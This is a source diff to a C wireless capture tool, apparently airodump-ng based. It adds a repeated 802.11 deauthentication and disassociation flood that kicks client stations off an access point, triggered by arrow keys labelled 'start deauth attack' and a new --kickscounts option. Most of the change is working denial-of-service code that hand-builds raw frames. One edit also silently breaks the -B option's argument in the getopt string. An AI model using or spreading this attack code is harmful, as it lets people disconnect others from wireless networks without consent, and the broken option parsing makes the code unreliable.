@@ -97,61 +97,109 @@ int CHECK_REALLY_DEAUTH(struct AP_info *ap_cur)
 	return 0;
 }
 
-unsigned long nb_pkt_sent;
 struct wif *wi[MAX_CARDS];
-int send_packet(void *buf, size_t count)
+int deauth_STA_FROM_AP(struct AP_info* pAP, struct ST_info* pST)
 {
-	unsigned char *pkt = (unsigned char*) buf;
+	unsigned int i = 0;
 
-	if ((count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
-	{
-		pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
-		pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
-	}
+	unsigned char bufTmp[26];
 
-	if (wi_write(wi[0], buf, count, NULL) == -1)
+///disassociate STA->AP
+	bufTmp[0] = 0xA0;//disassociate
+	bufTmp[1] = 0x00;//normal
+	bufTmp[2] = 0x3A;//duration 1
+	bufTmp[3] = 0x01;//duration 2
+	memcpy(&bufTmp[4],  pAP->bssid, 6);
+	memcpy(&bufTmp[16], pAP->bssid, 6);
+	memcpy(&bufTmp[10], pST->stmac, 6);
+	bufTmp[24] = 0x08;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+	bufTmp[25] = 0x00;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+
+	int nb_pkt_sent=0;
+	for(i=0; i<G.m_KickCounts; i++)
 	{
-		switch (errno)
+		nb_pkt_sent++;
+		bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+		bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+		if (wi_write(wi[0], bufTmp, 26, NULL) == -1)
 		{
-		case EAGAIN:
-		case ENOBUFS:
-			usleep(10000);
-			return 0; /* XXX not sure I like this... -sorbo */
+			return 1;
 		}
-
-		perror("wi_write()");
-		return -1;
 	}
+/////////////////////////
 
-	nb_pkt_sent++;
+///disassociate AP->STA
+		bufTmp[0] = 0xA0;//disassociate
+		bufTmp[1] = 0x00;//normal
+		bufTmp[2] = 0x3A;//duration 1
+		bufTmp[3] = 0x01;//duration 2
+		memcpy(&bufTmp[4],  pST->stmac, 6);
+		memcpy(&bufTmp[16], pAP->bssid, 6);
+		memcpy(&bufTmp[10], pAP->bssid, 6);
+		bufTmp[24] = 0x08;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+		bufTmp[25] = 0x00;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+
+		nb_pkt_sent=0;
+		for(i=0; i<G.m_KickCounts; i++)
+		{
+			nb_pkt_sent++;
+			bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+			bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+			if (wi_write(wi[0], bufTmp, 26, NULL) == -1)
+			{
+				return 1;
+			}
+		}
+/////////////////////////
+
+///deauthenticate AP->STA
+	bufTmp[0] = 0xC0;
+	bufTmp[1] = 0x00;
+	bufTmp[2] = 0x3A;//duration 1
+	bufTmp[3] = 0x01;//duration 2
+	memcpy(&bufTmp[4],  pST->stmac, 6);
+	memcpy(&bufTmp[16], pAP->bssid, 6);
+	memcpy(&bufTmp[10], pAP->bssid, 6);
+	bufTmp[24] = 0x07;
+	bufTmp[25] = 0x00;
+
+	nb_pkt_sent=0;
+	for(i=0; i<G.m_KickCounts; i++)
+	{
+		nb_pkt_sent++;
+		bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+		bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+		if (wi_write(wi[0], bufTmp, 26, NULL) == -1)
+		{
+			return 1;
+		}
+	}
+/////////////////////////
+
+///deauthenticate STA->AP
+	bufTmp[0] = 0xC0;
+	bufTmp[1] = 0x00;
+	bufTmp[2] = 0x3A;//duration 1
+	bufTmp[3] = 0x01;//duration 2
+	memcpy(&bufTmp[4],  pAP->bssid, 6);
+	memcpy(&bufTmp[16], pAP->bssid, 6);
+	memcpy(&bufTmp[10], pST->stmac, 6);
+	bufTmp[24] = 0x07;
+	bufTmp[25] = 0x00;
+
+	nb_pkt_sent=0;
+	for(i=0; i<G.m_KickCounts; i++)
+	{
+		nb_pkt_sent++;
+		bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+		bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+		if (wi_write(wi[0], bufTmp, 26, NULL) == -1)
+		{
+			return 1;
+		}
+	}
+/////////////////////////
 	return 0;
-}
-
-int deauth_STA_FROM_AP(void* r_bssid, void* r_dmac)
-{
-	unsigned char h80211[4096];
-
-#define DEAUTH_REQ      \
-    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
-    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
-
-	memcpy(h80211, DEAUTH_REQ, 26);
-	memcpy(h80211 + 16, r_bssid, 6);
-
-	memcpy(h80211 + 4, r_dmac, 6);
-	memcpy(h80211 + 10, r_bssid, 6);
-
-	if (send_packet(h80211, 26) < 0)
-		return (1);
-
-	usleep(2000);
-
-	memcpy(h80211 + 4, r_bssid, 6);
-	memcpy(h80211 + 10, r_dmac, 6);
-
-	if (send_packet(h80211, 26) < 0)
-		return (1);
-	return (0);
 }
 
 void RemoveAPfromDeauthFile(unsigned char* pMAC)
@@ -427,8 +475,8 @@ void resetSelection()
 #define KEY_SPACE	0x20	//pause/resume output
 #define KEY_ARROW_UP	0x41	//scroll
 #define KEY_ARROW_DOWN	0x42	//scroll
-#define KEY_ARROW_RIGHT 0x43	//scroll
-#define KEY_ARROW_LEFT	0x44	//scroll
+#define KEY_ARROW_RIGHT 0x43	//start deauth attack on AP
+#define KEY_ARROW_LEFT	0x44	//start deauth attack on AP
 #define KEY_a		0x61	//cycle through active information (ap/sta/ap+sta/ap+sta+ack)
 #define KEY_c		0x63	//cycle through channels
 #define KEY_d		0x64	//default mode
@@ -939,6 +987,8 @@ char usage[] =
 				"                              pcap, ivs, csv, gps, kismet, netxml\n"
 				"      --ignore-negative-one : Removes the message that says\n"
 				"                              fixed channel <interface>: -1\n"
+				"      --kickscounts<counts> : Count of disass and deauths packets on attack\n"
+
 				"\n"
 				"  Filter options:\n"
 				"      --encrypt   <suite>   : Filter APs by cipher suite\n"
@@ -1753,7 +1803,6 @@ int dump_add_packet(unsigned char *h80211, int caplen, struct rx_info *ri,
 	if (h80211[0] == 0x10)
 	{
 		/* reset the WPA handshake state */
-
 		if (st_cur != NULL && st_cur->wpa.state != 0xFF)
 			st_cur->wpa.state = 0;
 //        printf("initial auth %d\n", ap_cur->wpa_state);
@@ -3419,8 +3468,15 @@ void dump_print(int ws_row, int ws_col, int if_num)
 			g_uiBytesDeltaPerSec = 1000000
 					* ((float) (ulRead_Bytes - ulRead_Bytes_tmp))
 					/ g_uiTempTimeAggregator;
+
+			g_uiPacketsDeltaPerSec = 1000000
+					* ((float) (ulRead_pkts - ulRead_pkts_tmp))
+					/ g_uiTempTimeAggregator;
+
 			g_uiTempTimeAggregator = 0;
 			ulRead_Bytes_tmp = ulRead_Bytes;
+			ulRead_pkts_tmp = ulRead_pkts;
+
 			g_flag500ms_hopper_for_print = 1;
 		}
 
@@ -3430,7 +3486,8 @@ void dump_print(int ws_row, int ws_col, int if_num)
 		printMbKbGbsize(bufFormatMbs_uiBytesDeltaPerSec, g_uiBytesDeltaPerSec);
 
 		snprintf(strbuf, sizeof(strbuf) - 1,
-				"%s %s/s Beacons:%lu Pkts:%lu CH%2d", bufFormatMbs_ulRead_Bytes,
+				"%4dp/s %s %s/s Beacons:%lu Pkts:%lu CH%2d", g_uiPacketsDeltaPerSec,
+				bufFormatMbs_ulRead_Bytes,
 				bufFormatMbs_uiBytesDeltaPerSec, g_ulRead_pkts_beacons,
 				ulRead_pkts, G.channel[0]);
 		for (i = 1; i < if_num; i++)
@@ -3899,7 +3956,7 @@ void dump_print(int ws_row, int ws_col, int if_num)
 					}
 					if (g_iLastSetChannel != -1)
 					{
-						deauth_STA_FROM_AP(ap_cur->bssid, st_cur->stmac);
+						deauth_STA_FROM_AP(ap_cur, st_cur);
 						usleep(1000);
 					}
 					struct timeval time_end;
@@ -6212,6 +6269,7 @@ int main(int argc, char *argv[])
 	{ "ignore-negative-one", 0, &G.ignore_negative_one, 1 },
 	{ "manufacturer", 0, 0, 'M' },
 	{ "uptime", 0, 0, 'U' },
+	{ "kickscounts", 1, 0, 'K' },
 	{ 0, 0, 0, 0 } };
 
 #ifdef USE_GCRYPT
@@ -6274,6 +6332,7 @@ int main(int argc, char *argv[])
 	G.numaps = 0;
 	G.maxnumaps = 0;
 	G.berlin = 120;
+	G.m_KickCounts = 1;
 	G.show_ap = 1;
 	G.show_sta = 1;
 	G.show_ack = 0;
@@ -6377,7 +6436,7 @@ int main(int argc, char *argv[])
 		option_index = 0;
 
 		option = getopt_long(argc, argv,
-				"b:c:egiw:s:t:u:m:d:N:R:aHDB:Ahf:r:EC:o:x:MU", long_options,
+				"b:c:egiw:s:t:u:m:d:N:R:aHDBK:Ahf:r:EC:o:x:MU", long_options,
 				&option_index);
 
 		if (option < 0)
@@ -6625,6 +6684,11 @@ int main(int argc, char *argv[])
 
 			if (G.berlin <= 0)
 				G.berlin = 120;
+
+			break;
+		case 'K':
+
+			G.m_KickCounts = atoi(optarg);
 
 			break;
 
@@ -7359,7 +7423,7 @@ int main(int argc, char *argv[])
 
 			for (i = 0; i < G.num_cards; i++)
 			{
-				if (FD_ISSET(fd_raw[i], &rfds))
+				if ( FD_ISSET( fd_raw[i], &rfds ))
 				{
 
 					memset(buffer, 0, sizeof(buffer));
